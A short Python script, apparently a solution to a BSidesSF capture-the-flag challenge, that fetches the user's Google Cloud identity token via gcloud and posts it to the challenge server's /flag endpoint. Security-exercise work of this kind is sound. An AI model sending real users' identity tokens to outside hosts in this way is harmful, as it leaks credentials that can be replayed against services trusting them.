import subprocess
import requests
# Get your jwt using gcloud 
token = subprocess.check_output(['gcloud', 'auth', 'print-identity-token'])
# Send it to the challenge 
url = 'https://let-me-do-it-cdf02c16.challenges.bsidessf.net/flag'
obj = {'id_token':token.strip()}
response = requests.post(url, data = obj)
print(response.text)

